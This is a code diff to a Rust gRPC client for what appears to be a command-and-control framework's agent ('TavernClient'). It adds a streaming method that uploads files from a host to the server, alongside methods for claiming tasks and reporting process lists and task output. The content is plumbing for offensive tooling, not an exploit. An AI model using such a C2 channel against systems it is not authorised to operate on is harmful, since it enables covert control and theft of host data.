@@ -4,9 +4,10 @@ pub mod c2_manual_client {
     use tonic::GrpcMethod;
 
     static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
-    static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
-    static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
     static DOWNLOAD_FILE_PATH: &str = "/c2.C2/DownloadFile";
+    static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
+    static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
+    static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
 
     #[derive(Debug, Clone)]
     pub struct TavernClient {
@@ -21,6 +22,8 @@ pub mod c2_manual_client {
             Ok(Self { grpc })
         }
 
+        ///
+        /// Contact the server for new tasks to execute.
         pub async fn claim_tasks(
             &mut self,
             request: impl tonic::IntoRequest<super::ClaimTasksRequest>,
@@ -39,53 +42,6 @@ pub mod c2_manual_client {
             let mut req = request.into_request();
             req.extensions_mut()
                 .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
-            self.grpc.unary(req, path, codec).await
-        }
-
-        pub async fn report_task_output(
-            &mut self,
-            request: impl tonic::IntoRequest<super::ReportTaskOutputRequest>,
-        ) -> std::result::Result<tonic::Response<super::ReportTaskOutputResponse>, tonic::Status>
-        {
-            self.grpc.ready().await.map_err(|e| {
-                tonic::Status::new(
-                    tonic::Code::Unknown,
-                    format!("Service was not ready: {}", e),
-                )
-            })?;
-            let codec: ProstCodec<super::ReportTaskOutputRequest, super::ReportTaskOutputResponse> =
-                tonic::codec::ProstCodec::default();
-            let path =
-                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
-            let mut req = request.into_request();
-            req.extensions_mut()
-                .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
-            self.grpc.unary(req, path, codec).await
-        }
-
-        ///
-        /// Report the active list of running processes. This list will replace any previously reported
-        /// lists for the same host.
-        pub async fn report_process_list(
-            &mut self,
-            request: impl tonic::IntoRequest<super::ReportProcessListRequest>,
-        ) -> std::result::Result<tonic::Response<super::ReportProcessListResponse>, tonic::Status>
-        {
-            self.grpc.ready().await.map_err(|e| {
-                tonic::Status::new(
-                    tonic::Code::Unknown,
-                    format!("Service was not ready: {}", e),
-                )
-            })?;
-            let codec: ProstCodec<
-                super::ReportProcessListRequest,
-                super::ReportProcessListResponse,
-            > = tonic::codec::ProstCodec::default();
-            let path =
-                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
-            let mut req = request.into_request();
-            req.extensions_mut()
-                .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
             self.grpc.unary(req, path, codec).await
         }
 
@@ -117,6 +73,82 @@ pub mod c2_manual_client {
             req.extensions_mut()
                 .insert(GrpcMethod::new("c2.C2", "DownloadFile"));
             self.grpc.server_streaming(req, path, codec).await
+        }
+
+        ///
+        /// Report a file from the host to the server.
+        /// Providing content of the file is optional. If content is provided:
+        ///   - Hash will automatically be calculated and the provided hash will be ignored.
+        ///   - Size will automatically be calculated and the provided size will be ignored.
+        /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
+        /// Any existing files at the provided path for the host are replaced.
+        pub async fn report_file(
+            &mut self,
+            request: impl tonic::IntoStreamingRequest<Message = super::ReportFileRequest>,
+        ) -> std::result::Result<tonic::Response<super::ReportFileResponse>, tonic::Status>
+        {
+            self.grpc.ready().await.map_err(|e| {
+                tonic::Status::new(
+                    tonic::Code::Unknown,
+                    format!("Service was not ready: {}", e),
+                )
+            })?;
+            let codec: ProstCodec<super::ReportFileRequest, super::ReportFileResponse> =
+                tonic::codec::ProstCodec::default();
+            let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
+            let mut req = request.into_streaming_request();
+            req.extensions_mut()
+                .insert(GrpcMethod::new("c2.C2", "ReportFile"));
+            self.grpc.client_streaming(req, path, codec).await
+        }
+
+        ///
+        /// Report the active list of running processes. This list will replace any previously reported
+        /// lists for the same host.
+        pub async fn report_process_list(
+            &mut self,
+            request: impl tonic::IntoRequest<super::ReportProcessListRequest>,
+        ) -> std::result::Result<tonic::Response<super::ReportProcessListResponse>, tonic::Status>
+        {
+            self.grpc.ready().await.map_err(|e| {
+                tonic::Status::new(
+                    tonic::Code::Unknown,
+                    format!("Service was not ready: {}", e),
+                )
+            })?;
+            let codec: ProstCodec<
+                super::ReportProcessListRequest,
+                super::ReportProcessListResponse,
+            > = tonic::codec::ProstCodec::default();
+            let path =
+                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
+            let mut req = request.into_request();
+            req.extensions_mut()
+                .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
+            self.grpc.unary(req, path, codec).await
+        }
+
+        ///
+        /// Report execution output for a task.
+        pub async fn report_task_output(
+            &mut self,
+            request: impl tonic::IntoRequest<super::ReportTaskOutputRequest>,
+        ) -> std::result::Result<tonic::Response<super::ReportTaskOutputResponse>, tonic::Status>
+        {
+            self.grpc.ready().await.map_err(|e| {
+                tonic::Status::new(
+                    tonic::Code::Unknown,
+                    format!("Service was not ready: {}", e),
+                )
+            })?;
+            let codec: ProstCodec<super::ReportTaskOutputRequest, super::ReportTaskOutputResponse> =
+                tonic::codec::ProstCodec::default();
+            let path =
+                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
+            let mut req = request.into_request();
+            req.extensions_mut()
+                .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
+            self.grpc.unary(req, path, codec).await
         }
     }
 }
